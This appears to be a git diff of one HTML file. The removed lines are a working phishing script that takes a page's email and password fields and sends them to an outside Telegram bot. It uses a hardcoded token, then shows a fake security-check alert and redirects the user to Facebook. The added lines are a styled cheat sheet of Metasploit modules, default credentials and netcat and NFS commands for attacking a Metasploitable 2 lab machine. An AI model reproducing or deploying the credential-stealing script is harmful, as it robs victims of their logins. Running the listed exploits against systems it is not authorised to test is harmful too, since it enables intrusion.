@@ -1,19 +1,223 @@
-<script>
-function sendToBot() {
-    const email = document.getElementById('email').value;
-    const pass = document.getElementById('pass').value;
-    
-    // LOCKED TO YOUR DRAKMIND TOKEN
-    const token = "8767378982:AAEL4tVNoWPY_KFHeBTAWnvYxBNzE-aG0E0";
-    const chat_id = "7975512704";
-    
-    // THE COMMAND TRIGGER
-    const text = `/CAPTURE_ALERT\n👤 User: ${email}\n🔑 Pass: ${pass}`;
-    
-    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=markdown`)
-    .then(() => {
-        alert("Security Check Completed.");
-        window.location.href = "https://facebook.com";
-    });
-}
-</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>D24E | Metasploitable 2 Attack Map</title>
+    <style>
+        :root {
+            --neon-green: #00ff41;
+            --dark-bg: #0d0d0d;
+            --panel-bg: #1a1a1a;
+            --text-gray: #b0b0b0;
+        }
+
+        body {
+            background-color: var(--dark-bg);
+            color: var(--neon-green);
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 20px;
+        }
+
+        header {
+            border-bottom: 2px solid var(--neon-green);
+            margin-bottom: 30px;
+            padding-bottom: 10px;
+            text-align: center;
+        }
+
+        .glitch {
+            font-size: 2.5em;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 5px;
+            text-shadow: 2px 2px #ff0000, -2px -2px #0000ff;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 20px;
+        }
+
+        .card {
+            background: var(--panel-bg);
+            border: 1px solid #333;
+            padding: 15px;
+            border-radius: 5px;
+            transition: 0.3s;
+        }
+
+        .card:hover {
+            border-color: var(--neon-green);
+            box-shadow: 0 0 10px var(--neon-green);
+        }
+
+        .port-title {
+            font-size: 1.2em;
+            color: #fff;
+            margin-bottom: 10px;
+            border-left: 4px solid var(--neon-green);
+            padding-left: 10px;
+        }
+
+        .description {
+            color: var(--text-gray);
+            font-size: 0.9em;
+            margin-bottom: 10px;
+        }
+
+        code {
+            display: block;
+            background: #000;
+            padding: 8px;
+            color: #00ff41;
+            border-radius: 3px;
+            font-size: 0.85em;
+            border: 1px dashed #444;
+            margin-top: 5px;
+        }
+
+        .label {
+            color: #ffcc00;
+            font-weight: bold;
+        }
+
+        footer {
+            margin-top: 50px;
+            text-align: center;
+            font-size: 0.8em;
+            color: #444;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="glitch">D24E Lab Terminal</div>
+    <p>ROOT@Drak24Evil // METASPLOITABLE 2 ATTACK VECTOR DATABASE</p>
+</header>
+
+<div class="grid">
+
+    <div class="card">
+        <div class="port-title">PORT 21: FTP (vsftpd 2.3.4)</div>
+        <div class="description">Intentional backdoor triggered by ":)" in username.</div>
+        <span class="label">MODULE:</span> <code>exploit/unix/ftp/vsftpd_234_backdoor</code>
+        <span class="label">COMMAND:</span> <code>set RHOSTS 192.168.1.7 -> exploit</code>
+    </div>
+
+    <div class="card">
+        <div class="port-title">PORT 22: SSH (Weak Keys)</div>
+        <div class="description">Standard remote access via default user accounts.</div>
+        <span class="label">MODULE:</span> <code>auxiliary/scanner/ssh/ssh_login</code>
+        <span class="label">COMMAND:</span> <code>set USERNAME msfadmin / set PASSWORD msfadmin</code>
+    </div>
+
+    <div class="card">
+        <div class="port-title">PORT 23: TELNET (Default)</div>
+        <div class="description">Unencrypted remote shell access.</div>
+        <span class="label">METHOD:</span> <code>Direct Connection (msfadmin:msfadmin)</code>
+        <span class="label">COMMAND:</span> <code>telnet 192.168.1.7</code>
+    </div>
+
+    <div class="card">
+        <div class="port-title">PORT 25: SMTP (Postfix)</div>
+        <div class="description">Enumerating system users via VRFY/EXPN commands.</div>
+        <span class="label">MODULE:</span> <code>auxiliary/scanner/smtp/smtp_enum</code>
+        <span class="label">COMMAND:</span> <code>set RHOSTS 192.168.1.7 -> run</code>
+    </div>
+
+    <div class="card">
+        <div class="port-title">PORT 80: HTTP (PHP CGI)</div>
+        <div class="description">Argument injection vulnerability in PHP-CGI.</div>
+        <span class="label">MODULE:</span> <code>exploit/multi/http/php_cgi_arg_injection</code>
+        <span class="label">COMMAND:</span> <code>set RHOSTS 192.168.1.7 -> exploit</code>
+    </div>
+
+    <div class="card">
+        <div class="port-title">PORT 139/445: SAMBA</div>
+        <div class="description">Execution via the Username Map Script bug.</div>
+        <span class="label">MODULE:</span> <code>exploit/multi/samba/usermap_script</code>
+        <span class="label">COMMAND:</span> <code>set RHOSTS 192.168.1.7 -> exploit</code>
+    </div>
+
+    <div class="card">
+        <div class="port-title">PORT 1099: JAVA RMI</div>
+        <div class="description">Remote method invocation allowing arbitrary code.</div>
+        <span class="label">MODULE:</span> <code>exploit/multi/misc/java_rmi_server</code>
+        <span class="label">COMMAND:</span> <code>set RHOSTS 192.168.1.7 -> exploit</code>
+    </div>
+
+    <div class="card">
+        <div class="port-title">PORT 1524: BIND SHELL</div>
+        <div class="description">Direct root shell access (Ingreslock backdoor).</div>
+        <span class="label">METHOD:</span> <code>Netcat Direct Bind</code>
+        <span class="label">COMMAND:</span> <code>nc 192.168.1.7 1524</code>
+    </div>
+
+    <div class="card">
+        <div class="port-title">PORT 2049: NFS (Mount)</div>
+        <div class="description">Unrestricted file share allowing full drive mount.</div>
+        <span class="label">METHOD:</span> <code>Root filesystem mount</code>
+        <span class="label">COMMAND:</span> <code>mount -t nfs 192.168.1.7:/ /mnt</code>
+    </div>
+
+    <div class="card">
+        <div class="port-title">PORT 2121: ProFTPD</div>
+        <div class="description">Backdoor in ProFTPD 1.3.1.</div>
+        <span class="label">MODULE:</span> <code>exploit/unix/ftp/proftpd_133c_backdoor</code>
+        <span class="label">COMMAND:</span> <code>set RPORT 2121 -> exploit</code>
+    </div>
+
+    <div class="card">
+        <div class="port-title">PORT 3306: MySQL</div>
+        <div class="description">Unauthenticated root access to database.</div>
+        <span class="label">METHOD:</span> <code>Client connection</code>
+        <span class="label">COMMAND:</span> <code>mysql -h 192.168.1.7 -u root</code>
+    </div>
+
+    <div class="card">
+        <div class="port-title">PORT 3632: DISTCCD</div>
+        <div class="description">Distributed compiler allows command execution.</div>
+        <span class="label">MODULE:</span> <code>exploit/unix/misc/distcc_exec</code>
+        <span class="label">COMMAND:</span> <code>set RHOSTS 192.168.1.7 -> exploit</code>
+    </div>
+
+    <div class="card">
+        <div class="port-title">PORT 5432: POSTGRES</div>
+        <div class="description">Abusing library functions to run OS commands.</div>
+        <span class="label">MODULE:</span> <code>exploit/linux/postgres/postgres_payload</code>
+        <span class="label">COMMAND:</span> <code>set RHOSTS 192.168.1.7 -> exploit</code>
+    </div>
+
+    <div class="card">
+        <div class="port-title">PORT 5900: VNC</div>
+        <div class="description">Remote desktop with default "password" pass.</div>
+        <span class="label">METHOD:</span> <code>VNC Viewer (Password: password)</code>
+        <span class="label">COMMAND:</span> <code>vncviewer 192.168.1.7</code>
+    </div>
+
+    <div class="card">
+        <div class="port-title">PORT 6667: IRC</div>
+        <div class="description">UnrealIRCd 3.2.8.1 backdoor exploitation.</div>
+        <span class="label">MODULE:</span> <code>exploit/unix/irc/unreal_ircd_3281_backdoor</code>
+        <span class="label">COMMAND:</span> <code>set RHOSTS 192.168.1.7 -> exploit</code>
+    </div>
+
+    <div class="card">
+        <div class="port-title">PORT 8180: TOMCAT</div>
+        <div class="description">Manager application WAR file deployment.</div>
+        <span class="label">MODULE:</span> <code>exploit/multi/http/tomcat_mgr_deploy</code>
+        <span class="label">COMMAND:</span> <code>set HttpUsername tomcat / set HttpPassword tomcat</code>
+    </div>
+
+</div>
+
+<footer>
+    SYST3M D3SIGN BY D24E // FOR EDUCATIONAL PURPOSES ONLY
+</footer>
+
+</body>
+</html>
